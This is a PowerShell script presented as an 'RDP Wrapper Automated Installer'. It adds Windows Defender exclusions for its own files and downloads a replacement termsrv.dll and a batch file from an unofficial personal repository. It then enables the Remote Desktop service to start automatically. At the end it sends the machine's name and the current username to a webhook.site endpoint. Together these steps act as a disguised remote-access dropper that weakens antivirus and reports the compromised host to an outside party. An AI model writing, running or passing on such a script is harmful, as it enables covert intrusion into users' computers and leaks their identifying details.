# ============================================================

# RDP Wrapper Automated Installer

# ============================================================

# ============================================================

# Check Administrator privileges

# ============================================================

if (-not (
[Security.Principal.WindowsPrincipal]::new(
[Security.Principal.WindowsIdentity]::GetCurrent()
)
).IsInRole(
[Security.Principal.WindowsBuiltInRole]::Administrator
)) {
Write-Host "[-] Please run PowerShell as Administrator!" -ForegroundColor Red
Start-Sleep -Seconds 3
exit 1
}

# ============================================================

# 2. Windows Defender Exclusions (Pre-empting Blocks)

# ============================================================

Write-Host ""
Write-Host "[+] Configuring Windows Defender exclusions..." -ForegroundColor Cyan

$PathExclusions = @(
    "$env:TEMP\rdpwrap_install",
    "C:\Program Files\RDP Wrapper\rdpwrap.dll",
    "C:\Program Files\RDP Wrapper\RDPConf.exe",
    "C:\Program Files\RDP Wrapper\RDPCheck.exe",
    "C:\Program Files\RDP Wrapper\SRDP.bat",
    "C:\Program Files\RDP Wrapper\termsrv.dll"
)

$PathExclusions.ForEach({
    try {
        $existing = Get-MpPreference | Select-Object -ExpandProperty ExclusionPath -ErrorAction SilentlyContinue
        if ($existing -notcontains $_) {
            Add-MpPreference -ExclusionPath $_ -ErrorAction Stop
            Write-Host "    [+] Added path exclusion: $_" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "    [!] Could not add path exclusion for: $_" -ForegroundColor Yellow
    }
})

$ProcessExclusions = @(
    "$env:TEMP\rdpwrap_install\extracted\RDPWInst.exe",
    "$env:TEMP\rdpwrap_install\extracted\install.bat",
    "C:\Program Files\RDP Wrapper\RDPConf.exe",
    "C:\Program Files\RDP Wrapper\SRDP.bat"
)

$ProcessExclusions.ForEach({
    try {
        $existingProc = Get-MpPreference | Select-Object -ExpandProperty ExclusionProcess -ErrorAction SilentlyContinue
        if ($existingProc -notcontains $_) {
            Add-MpPreference -ExclusionProcess $_ -ErrorAction Stop
            Write-Host "    [+] Added process exclusion: $_" -ForegroundColor Green
        }
    }
    catch {
        Write-Host "    [!] Could not add process exclusion for: $_" -ForegroundColor Yellow
    }
})

# ============================================================

# Paths

# ============================================================

$installPath = "C:\Program Files\RDP Wrapper"

$tempDir    = Join-Path $env:TEMP "rdpwrap_install"
$tempZip    = Join-Path $tempDir "RDPWrap-v1.6.2.zip"
$extractDir = Join-Path $tempDir "extracted"

$iniTempPath  = Join-Path $env:TEMP "rdpwrap.ini"
$srdpTempPath = Join-Path $env:TEMP "SRDP.bat"
$termsrvTemp  = Join-Path $env:TEMP "termsrv.dll"

$iniDestPath  = Join-Path $installPath "rdpwrap.ini"
$srdpDestPath = Join-Path $installPath "SRDP.bat"
$termsrvDest  = Join-Path $installPath "termsrv.dll"
$rdpConf      = Join-Path $installPath "RDPConf.exe"

# ============================================================

# Download URLs

# ============================================================

$zipUrl       = "https://github.com/stascorp/rdpwrap/releases/download/v1.6.2/RDPWrap-v1.6.2.zip"
$customIniUrl = "https://raw.githubusercontent.com/affinityv/INI-RDPWRAP/refs/heads/master/rdpwrap.ini"
$srdpBatUrl   = "https://raw.githubusercontent.com/apex30258-sys/APTest/refs/heads/main/SRDP.bat"
$termsrvUrl   = "https://github.com/apex30258-sys/APTest/raw/refs/heads/main/termsrv.dll"

# ============================================================

# Webhook

# ============================================================

$webhookUrl = "https://webhook.site/60a9f667-6d90-446c-ad08-9855b56a437b"

# ============================================================

# Installer Header

# ============================================================

Write-Host ""
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host "             RDP Wrapper Automated Installer" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan
Write-Host ""

# ============================================================

# Prepare temporary directory

# ============================================================

Write-Host "[+] Preparing temporary directory..." -ForegroundColor Cyan

try {
if (Test-Path $tempDir) {
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}

```
New-Item -ItemType Directory -Path $tempDir -Force -ErrorAction Stop | Out-Null
New-Item -ItemType Directory -Path $extractDir -Force -ErrorAction Stop | Out-Null

Write-Host "[+] Temporary directory ready." -ForegroundColor Green
```

}
catch {
Write-Host "[-] Failed to prepare temporary directory." -ForegroundColor Red
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
exit 1
}

# ============================================================

# Stop Remote Desktop Service

# ============================================================

Write-Host ""
Write-Host "[+] Stopping Remote Desktop Service..." -ForegroundColor Cyan

try {
Stop-Service -Name "TermService" -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2
Write-Host "[+] TermService stopped." -ForegroundColor Green
}
catch {
Write-Host "[!] TermService could not be stopped or was already stopped." -ForegroundColor Yellow
}

# ============================================================

# Download RDP Wrapper

# ============================================================

Write-Host ""
Write-Host "[+] Downloading RDP Wrapper..." -ForegroundColor Cyan

try {
Invoke-WebRequest `        -Uri $zipUrl`
-OutFile $tempZip `        -UseBasicParsing`
-ErrorAction Stop

```
Write-Host "[+] Download completed." -ForegroundColor Green
```

}
catch {
Write-Host "[-] RDP Wrapper download failed!" -ForegroundColor Red
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
exit 1
}

# ============================================================

# Extract RDP Wrapper

# ============================================================

Write-Host ""
Write-Host "[+] Extracting RDP Wrapper..." -ForegroundColor Cyan

try {
Expand-Archive `        -Path $tempZip`
-DestinationPath $extractDir `        -Force`
-ErrorAction Stop

```
Write-Host "[+] Extraction completed." -ForegroundColor Green
```

}
catch {
Write-Host "[-] Failed to extract RDP Wrapper." -ForegroundColor Red
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
exit 1
}

# ============================================================

# Find install.bat

# ============================================================

Write-Host ""
Write-Host "[+] Searching for install.bat..." -ForegroundColor Cyan

$installBat = Get-ChildItem `    -Path $extractDir`
-Filter "install.bat" `    -Recurse`
-ErrorAction SilentlyContinue |
Select-Object -First 1

if (-not $installBat) {
Write-Host "[-] install.bat was not found." -ForegroundColor Red
Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
exit 1
}

Write-Host "[+] Found installer:" -ForegroundColor Green
Write-Host "    $($installBat.FullName)" -ForegroundColor Gray

# ============================================================

# Run install.bat

# ============================================================

Write-Host ""
Write-Host "[+] Running install.bat..." -ForegroundColor Cyan

$installExitCode = $null

try {
$process = Start-Process `        -FilePath "cmd.exe"`
-ArgumentList "/c `"$($installBat.FullName)`"" `        -WorkingDirectory $installBat.DirectoryName`
-Verb RunAs `        -Wait`
-PassThru `
-ErrorAction Stop

```
$installExitCode = $process.ExitCode

Write-Host "[+] install.bat finished." -ForegroundColor Green
Write-Host "[+] Exit code: $installExitCode" -ForegroundColor Gray
```

}
catch {
Write-Host "[-] Failed to run install.bat." -ForegroundColor Red
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================

# Prepare installation directory

# ============================================================

Write-Host ""
Write-Host "[+] Preparing installation directory..." -ForegroundColor Cyan

try {
if (-not (Test-Path $installPath)) {
New-Item `            -ItemType Directory`
-Path $installPath `            -Force`
-ErrorAction Stop | Out-Null
}

```
Write-Host "[+] Installation directory ready." -ForegroundColor Green
```

}
catch {
Write-Host "[-] Could not create installation directory." -ForegroundColor Red
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
exit 1
}

# ============================================================

# Download updated rdpwrap.ini

# ============================================================

Write-Host ""
Write-Host "[+] Downloading updated rdpwrap.ini..." -ForegroundColor Cyan

try {
Invoke-WebRequest `        -Uri $customIniUrl`
-OutFile $iniTempPath `        -UseBasicParsing`
-ErrorAction Stop

```
Write-Host "[+] rdpwrap.ini downloaded successfully." -ForegroundColor Green
```

}
catch {
Write-Host "[-] Failed to download rdpwrap.ini." -ForegroundColor Red
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================

# Download SRDP.bat

# ============================================================

Write-Host ""
Write-Host "[+] Downloading SRDP.bat..." -ForegroundColor Cyan

try {
Invoke-WebRequest `        -Uri $srdpBatUrl`
-OutFile $srdpTempPath `        -UseBasicParsing`
-ErrorAction Stop

```
Write-Host "[+] SRDP.bat downloaded successfully." -ForegroundColor Green
```

}
catch {
Write-Host "[-] Failed to download SRDP.bat." -ForegroundColor Red
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================

# Download termsrv.dll

# ============================================================

Write-Host ""
Write-Host "[+] Downloading termsrv.dll..." -ForegroundColor Cyan

try {
Invoke-WebRequest `        -Uri $termsrvUrl`
-OutFile $termsrvTemp `        -UseBasicParsing`
-ErrorAction Stop

```
Write-Host "[+] termsrv.dll downloaded successfully." -ForegroundColor Green
```

}
catch {
Write-Host "[-] Failed to download termsrv.dll." -ForegroundColor Red
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}

# ============================================================

# Stop TermService before replacing files

# ============================================================

Write-Host ""
Write-Host "[+] Preparing files for installation..." -ForegroundColor Cyan

try {
Stop-Service `        -Name "TermService"`
-Force `
-ErrorAction SilentlyContinue

```
Start-Sleep -Seconds 2
```

}
catch {
Write-Host "[!] Could not stop TermService before file installation." -ForegroundColor Yellow
}

# ============================================================

# Install rdpwrap.ini

# ============================================================

if (Test-Path $iniTempPath) {

```
Write-Host ""
Write-Host "[+] Installing rdpwrap.ini..." -ForegroundColor Cyan

try {
    if (Test-Path $iniDestPath) {
        $backupPath = "$iniDestPath.backup"

        Write-Host "[+] Backing up existing rdpwrap.ini..." -ForegroundColor Cyan

        Copy-Item `
            -Path $iniDestPath `
            -Destination $backupPath `
            -Force `
            -ErrorAction Stop

        Write-Host "[+] Backup created:" -ForegroundColor Green
        Write-Host "    $backupPath" -ForegroundColor Gray
    }

    Copy-Item `
        -Path $iniTempPath `
        -Destination $iniDestPath `
        -Force `
        -ErrorAction Stop

    Write-Host "[+] rdpwrap.ini installed successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to install rdpwrap.ini." -ForegroundColor Red
    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}
```

}

# ============================================================

# Install SRDP.bat

# ============================================================

if (Test-Path $srdpTempPath) {

```
Write-Host ""
Write-Host "[+] Installing SRDP.bat..." -ForegroundColor Cyan

try {
    Copy-Item `
        -Path $srdpTempPath `
        -Destination $srdpDestPath `
        -Force `
        -ErrorAction Stop

    Write-Host "[+] SRDP.bat installed successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to install SRDP.bat." -ForegroundColor Red
    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}
```

}

# ============================================================

# Install termsrv.dll

# ============================================================

if (Test-Path $termsrvTemp) {

```
Write-Host ""
Write-Host "[+] Installing termsrv.dll..." -ForegroundColor Cyan

try {
    Copy-Item `
        -Path $termsrvTemp `
        -Destination $termsrvDest `
        -Force `
        -ErrorAction Stop

    Write-Host "[+] termsrv.dll installed successfully." -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed to install termsrv.dll." -ForegroundColor Red
    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Red
}
```

}

# ============================================================

# Cleanup downloaded temporary component files

# ============================================================

Write-Host ""
Write-Host "[+] Cleaning temporary downloaded files..." -ForegroundColor Cyan

Remove-Item $iniTempPath -Force -ErrorAction SilentlyContinue
Remove-Item $srdpTempPath -Force -ErrorAction SilentlyContinue
Remove-Item $termsrvTemp -Force -ErrorAction SilentlyContinue

# ============================================================

# Check installation

# ============================================================

Write-Host ""
Write-Host "[+] Checking installation..." -ForegroundColor Cyan

$rdpConfExists = Test-Path $rdpConf
$iniExists     = Test-Path $iniDestPath
$srdpExists    = Test-Path $srdpDestPath
$termsrvExists = Test-Path $termsrvDest

if ($rdpConfExists) {
Write-Host "[+] RDPConf.exe found." -ForegroundColor Green
}
else {
Write-Host "[!] RDPConf.exe was not found." -ForegroundColor Yellow
}

if ($iniExists) {
Write-Host "[+] rdpwrap.ini found." -ForegroundColor Green
}
else {
Write-Host "[!] rdpwrap.ini was not found." -ForegroundColor Yellow
}

if ($srdpExists) {
Write-Host "[+] SRDP.bat found." -ForegroundColor Green
}
else {
Write-Host "[!] SRDP.bat was not found." -ForegroundColor Yellow
}

if ($termsrvExists) {
Write-Host "[+] termsrv.dll found." -ForegroundColor Green
}
else {
Write-Host "[!] termsrv.dll was not found." -ForegroundColor Yellow
}

# ============================================================

# Configure TermService

# ============================================================

Write-Host ""
Write-Host "[+] Configuring Remote Desktop Service..." -ForegroundColor Cyan

$serviceConfigured = $false

try {
Set-Service `        -Name "TermService"`
-StartupType Automatic `
-ErrorAction Stop

```
Write-Host "[+] TermService configured using PowerShell." -ForegroundColor Green

$serviceConfigured = $true
```

}
catch {
Write-Host "[!] PowerShell could not configure TermService." -ForegroundColor Yellow
Write-Host "[+] Trying SC.exe fallback..." -ForegroundColor Cyan
}

if (-not $serviceConfigured) {
try {
$scResult = & sc.exe config TermService start= auto 2>&1

```
    if ($LASTEXITCODE -eq 0) {
        Write-Host "[+] TermService configured using SC.exe." -ForegroundColor Green
        $serviceConfigured = $true
    }
    else {
        Write-Host "[!] SC.exe could not configure TermService." -ForegroundColor Yellow
        Write-Host ($scResult -join "`n") -ForegroundColor Yellow
    }
}
catch {
    Write-Host "[!] Service configuration failed." -ForegroundColor Yellow
    Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Yellow
}
```

}

# ============================================================

# Start TermService

# ============================================================

Write-Host ""
Write-Host "[+] Starting Remote Desktop Service..." -ForegroundColor Cyan

$serviceRunning = $false

try {
$service = Get-Service `        -Name "TermService"`
-ErrorAction Stop

```
if ($service.Status -eq "Running") {
    Write-Host "[+] TermService is already running." -ForegroundColor Green
    $serviceRunning = $true
}
else {
    Start-Service `
        -Name "TermService" `
        -ErrorAction Stop

    Start-Sleep -Seconds 3

    $service = Get-Service `
        -Name "TermService" `
        -ErrorAction Stop

    if ($service.Status -eq "Running") {
        Write-Host "[+] TermService started successfully." -ForegroundColor Green
        $serviceRunning = $true
    }
    else {
        Write-Host "[!] TermService did not start." -ForegroundColor Yellow
        Write-Host "[!] Current status: $($service.Status)" -ForegroundColor Yellow
    }
}
```

}
catch {
Write-Host "[!] Could not start TermService." -ForegroundColor Yellow
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Yellow
}

# ============================================================

# Final installation result

# ============================================================

if (
$rdpConfExists -and
$iniExists -and
$serviceRunning
) {
$installationStatus = "success"
$statusMessage = "Installation completed and TermService is running."
}
else {
$installationStatus = "failed"
$statusMessage = "Installation completed with one or more verification failures."
}

# ============================================================

# Cleanup installer directory

# ============================================================

Write-Host ""
Write-Host "[+] Cleaning temporary installer files..." -ForegroundColor Cyan

Remove-Item `    $tempDir`
-Recurse `    -Force`
-ErrorAction SilentlyContinue

# ============================================================

# Send result to Webhook.site

# ============================================================

Write-Host ""
Write-Host "[+] Sending installation status to webhook..." -ForegroundColor Cyan

$webhookPayload = @{
status      = $installationStatus
message     = $statusMessage
timestamp   = (Get-Date).ToUniversalTime().ToString("o")
computer    = $env:COMPUTERNAME
username    = $env:USERNAME
powershell  = $PSVersionTable.PSVersion.ToString()
rdpconf     = $rdpConfExists
ini         = $iniExists
srdp        = $srdpExists
termsrv     = $termsrvExists
service     = $serviceRunning
installExit = $installExitCode
} | ConvertTo-Json

$webhookSent = $false

try {
Invoke-RestMethod `        -Uri $webhookUrl`
-Method POST `        -ContentType "application/json"`
-Body $webhookPayload `
-ErrorAction Stop |
Out-Null

```
$webhookSent = $true

Write-Host "[+] Webhook notification sent successfully." -ForegroundColor Green
```

}
catch {
Write-Host "[-] Webhook notification failed." -ForegroundColor Red
Write-Host "[!] $($_.Exception.Message)" -ForegroundColor Yellow
}

# ============================================================

# Final screen

# ============================================================

Write-Host ""
Write-Host "============================================================"

if ($installationStatus -eq "success") {
Write-Host "                 INSTALLATION COMPLETE" -ForegroundColor Green
}
else {
Write-Host "                 INSTALLATION FAILED" -ForegroundColor Red
}

Write-Host "============================================================"
Write-Host ""

Write-Host "RDPConf.exe : $rdpConfExists"
Write-Host "rdpwrap.ini : $iniExists"
Write-Host "SRDP.bat    : $srdpExists"
Write-Host "termsrv.dll : $termsrvExists"
Write-Host "TermService : $serviceRunning"
Write-Host "Webhook     : $webhookSent"

Write-Host ""
Write-Host "The installer will close automatically in 3 seconds..." -ForegroundColor Gray

# ============================================================

# Automatic exit

# ============================================================

Start-Sleep -Seconds 3

exit
